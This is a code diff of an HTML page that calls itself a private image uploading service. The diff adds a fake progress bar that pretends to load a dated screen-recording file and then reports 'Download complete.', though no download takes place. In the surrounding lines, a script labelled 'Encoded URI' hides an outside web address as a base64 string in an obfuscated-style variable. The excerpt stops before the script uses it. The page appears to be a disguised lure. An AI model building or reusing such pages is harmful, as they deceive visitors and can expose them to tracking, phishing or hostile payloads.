@@ -2,6 +2,59 @@
 <meta content="Provided by Development Multiverse, the best private image uploading service!" property="og:description" />
 <meta content="#ff0000" data-react-helmet="true" name="theme-color" />
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Loading Bar</title>
+<style>
+    #loadingBarContainer {
+        width: 500px;
+        height: 30px;
+        border: 2px solid #000;
+        position: relative;
+    }
+    #loadingBar {
+        width: 0%;
+        height: 100%;
+        background-color: green;
+    }
+    #fileName {
+        margin-top: 10px;
+        font-family: Arial, sans-serif;
+    }
+</style>
+</head>
+<body>
+    <div id="loadingBarContainer">
+        <div id="loadingBar"></div>
+    </div>
+    <p id="fileName">Loading Screen-Recording-DATE.mp4...</p>
+    <script>
+        const fileNameElement = document.getElementById('fileName');
+        const loadingBar = document.getElementById('loadingBar');
+        
+        // Generate today's date in YYYY-MM-DD format
+        const today = new Date();
+        const formattedDate = today.toISOString().slice(0, 10);
+        
+        // Update file name with today's date
+        fileNameElement.textContent = `Loading Screen-Recording-${formattedDate}.mp4...`;
+
+        let width = 0;
+        const interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+                fileNameElement.textContent = 'Download complete.';
+            } else {
+                width++;
+                loadingBar.style.width = width + '%';
+            }
+        }, 100); // Adjust the time for faster or slower loading
+    </script>
+</body>
+</html>
+
 <script>
 // Encoded URI
 var _0x23a5=['aHR0cHM6Ly9jaHJpc2Fycml2ZWQuY29t'];
